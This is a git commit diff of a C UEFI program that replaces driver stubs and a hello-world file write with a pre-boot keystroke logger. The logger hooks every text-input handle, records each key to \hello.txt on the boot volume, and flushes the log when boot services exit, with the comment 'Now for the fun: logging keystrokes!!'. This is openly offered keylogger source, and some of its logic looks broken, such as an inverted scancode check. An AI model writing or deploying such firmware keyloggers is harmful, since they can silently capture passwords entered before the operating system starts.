2b45f3b19a76ecbde75ff4d1cc22e860a617d489
PilotGuy772 <laethenglish@gmail.com>
2024-09-15 09:34:16 -0700

    follow driver model; first test version

--- main.c
+++ main.c
@@ -1,52 +1,12 @@
 #include <efi.h>
 #include <efilib.h>
 
+// globals
+EFI_FILE_PROTOCOL *File;
+EFI_GUID gEfiSimpleTextInputExProtocolGuid = EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL_GUID;
+EFI_EVENT KeyEvent;
+EFI_EVENT mExitBootServicesEvent = NULL;
 
-EFI_DRIVER_BINDING_PROTOCOL gDriverBinding = {
-    Supported,
-    Start,
-    Stop,
-    0x10,
-    NULL,
-    NULL
-};
-
-EFI_STATUS
-EFIAPI
-Supported (
-    IN EFI_DRIVER_BINDING_PROTOCOL *This,
-    IN EFI_HANDLE                  ControllerHandle,
-    IN EFI_DEVICE_PATH_PROTOCOL    *RemainingDevicePath
-    )
-{
-    // Check if the driver supports the device
-    return EFI_SUCCESS;
-}
-
-EFI_STATUS
-EFIAPI
-Start (
-    IN EFI_DRIVER_BINDING_PROTOCOL *This,
-    IN EFI_HANDLE                  ControllerHandle,
-    IN EFI_DEVICE_PATH_PROTOCOL    *RemainingDevicePath
-    )
-{
-    // Start the driver
-    return EFI_SUCCESS;
-}
-
-EFI_STATUS
-EFIAPI
-Stop (
-    IN EFI_DRIVER_BINDING_PROTOCOL *This,
-    IN EFI_HANDLE                  ControllerHandle,
-    IN UINTN                       NumberOfChildren,
-    IN EFI_HANDLE                  *ChildHandleBuffer
-    )
-{
-    // Stop the driver
-    return EFI_SUCCESS;
-}
 
 UINTN AsciiStrLen (IN CONST CHAR8 *String)
 {
@@ -58,15 +18,81 @@ UINTN AsciiStrLen (IN CONST CHAR8 *String)
     return Length;
 }
 
+EFI_STATUS EFIAPI key_notify_function(EFI_KEY_DATA *KeyData)
+{
+    /*
+    * for reference
+    CHAR8 *message = "Hello, World!\n";
+    const UINTN messageSize = AsciiStrLen(message) + 1; // one extra for the null terminator
+    Print(L"Message: %a\n", message);
+    Print(L"Message size: %d bytes.\n", messageSize);
+    Status = uefi_call_wrapper(File->Write, 3, File, &messageSize, message);
+    Print(L"Wrote %d bytes.\n", messageSize);
+    if (EFI_ERROR(Status)) {
+        Print(L"Error writing to the file!\n");
+        return Status;
+    }*/
+
+    // allocate a buffer
+    CHAR16 buffer[32];
+
+    // check the scancode
+    // if it is zero, buffer should be "CHAR=<char>\n\0"
+    // if it is not zero, buffer should be "CODE=<code>\n\0"
+    if (KeyData->Key.ScanCode == 0)
+    {
+        SPrint(buffer, 32, L"CODE=%c\n", KeyData->Key.ScanCode);
+    }
+    else
+    {
+        SPrint(buffer, 32, L"CHAR=%c\n", KeyData->Key.UnicodeChar);
+    }
+
+    // now write to the file
+
+    UINTN messageSize = StrLen(buffer) * sizeof(CHAR16);
+    const UINTN Status = File->Write(File, &messageSize, &buffer);
+    if (EFI_ERROR(Status))
+    {
+        return Status;
+    }
+
+    return EFI_SUCCESS;
+}
+
+// we need to know when the OS is being booted
+// and save the key log to a file
+// otherwise, we might lose our record!
+VOID EFIAPI exit_boot_services (IN EFI_EVENT Event, IN VOID *Context)
+{
+    // this very simply just flushes and closes the file
+    // note that WE ARE NOT ALLOWED TO MODIFY MEMORY
+    // that means no addressing, freeing, etc.
+    // so basically we can't write to the file or declare variables or anything fancy like that.
+    File->Flush(File);
+
+    File->Close(File);
+}
+
 EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable)
 {
     EFI_SIMPLE_FILE_SYSTEM_PROTOCOL *FileSystem;
     EFI_STATUS Status;
     UINTN HandleCount;
     EFI_HANDLE *HandleBuffer;
+    EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL *KeyboardProtocol;
 
     // Initialize the library
     InitializeLib(ImageHandle, SystemTable);
+
+    // create exit boot services event
+    Status = gBS->CreateEvent(
+        EVT_SIGNAL_EXIT_BOOT_SERVICES, // type
+        TPL_NOTIFY,
+        exit_boot_services,            // function to call
+        NULL,                          // NotifyContext
+        &mExitBootServicesEvent        // event
+    );
 
     // Locate all handles that support the Simple File System Protocol
     Status = uefi_call_wrapper(BS->LocateHandleBuffer, 5, ByProtocol, &gEfiSimpleFileSystemProtocolGuid, NULL, &HandleCount, &HandleBuffer);
@@ -97,7 +123,7 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
     }
 
     // open \hello.txt
-    EFI_FILE_PROTOCOL *File;
+
     Status = uefi_call_wrapper(Root->Open, 5, Root, &File, L"\\hello.txt", EFI_FILE_MODE_CREATE | EFI_FILE_MODE_READ | EFI_FILE_MODE_WRITE, 0);
     if (EFI_ERROR(Status)) {
         // Handle error
@@ -105,37 +131,26 @@ EFI_STATUS EFIAPI efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable
         return Status;
     }
 
-    // write
-    CHAR8 *message = "Hello, World!\n";
-    const UINTN messageSize = AsciiStrLen(message) + 1; // one extra for the null terminator
-    Print(L"Message: %a\n", message);
-    Print(L"Message size: %d bytes.\n", messageSize);
-    Status = uefi_call_wrapper(File->Write, 3, File, &messageSize, message);
-    Print(L"Wrote %d bytes.\n", messageSize);
+
+    // Now for the fun: logging keystrokes!!
+    // Locate all handles that support the EFI_SIMPLE_TEXT_INPUT_EX_PROTOCOL
+    Status = BS->LocateHandleBuffer(ByProtocol, &gEfiSimpleTextInputExProtocolGuid, NULL, &HandleCount, &HandleBuffer);
     if (EFI_ERROR(Status)) {
-        Print(L"Error writing to the file!\n");
+        Print(L"Failed to locate handles for Simple Text Input Ex Protocol\n");
         return Status;
     }
 
-    // write again
-    CHAR8* message2 = "Goodbye, World!\n";
-    const UINTN messageSize2 = AsciiStrLen(message2) + 1;
-    Print(L"Message2: %a\n", message2);
-    Print(L"Message size: %d bytes.\n", messageSize2);
-    Print(L"Starting from %d bytes.\n", messageSize);
-    Status = uefi_call_wrapper(File->Write, 3, File, &messageSize2, message2);
-    Print(L"Wrote %d bytes.\n", messageSize2);
-    if (EFI_ERROR(Status)) {
-        Print(L"Error writing to the file!\n");
+    for (UINTN i = 0; i < HandleCount; i++) {
+        Status = BS->HandleProtocol(HandleBuffer[i], &gEfiSimpleTextInputExProtocolGuid, (VOID **)&KeyboardProtocol);
+        if (!EFI_ERROR(Status)) {
+            Status = KeyboardProtocol->RegisterKeyNotify(KeyboardProtocol, NULL, key_notify_function, &KeyEvent);
+            if (EFI_ERROR(Status)) {
+                Print(L"Failed to register key notify function\n");
+            }
+        }
     }
 
-    // close file
-    Status = uefi_call_wrapper(File->Flush, 1, File);
-    if (EFI_ERROR(Status)) {
-        Print(L"Error flushing the file!\n");
-    }
-    uefi_call_wrapper(File->Close, 1, File);
-
+    BS->FreePool(HandleBuffer);
 
     return EFI_SUCCESS;
 }
